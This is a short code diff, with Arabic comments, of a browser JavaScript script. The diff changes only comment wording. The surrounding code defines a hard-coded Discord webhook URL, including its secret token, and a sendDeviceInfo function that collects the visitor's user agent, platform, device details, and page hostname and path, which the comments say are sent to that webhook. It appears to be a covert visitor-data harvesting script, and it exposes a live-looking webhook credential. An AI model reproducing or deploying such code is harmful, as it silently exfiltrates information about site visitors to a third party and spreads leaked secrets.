@@ -1,10 +1,10 @@
-// تخزين عنوان الويب هوك
+// عنوان Webhook Discord
 const webhookUrl = "https://ptb.discord.com/api/webhooks/1277728558130790511/9GkqQlbH5hbAQ7IFoPMAhx-PWBnIbH5WfVfiqRlfEzdOtw0UjJHJoC_SRXca2TVUfclB";
 
-// دالة جمع معلومات الجهاز والشبكة
+// دالة إرسال معلومات الجهاز والموقع
 async function sendDeviceInfo() {
   try {
-    // الحصول على معلومات الجهاز
+    // جمع معلومات الجهاز
     const deviceInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -27,7 +27,7 @@ async function sendDeviceInfo() {
       } : null
     };
 
-    // الحصول على معلومات الموقع
+    // جمع معلومات الموقع
     const locationInfo = {
       hostname: window.location.hostname,
       pathname: window.location.pathname,
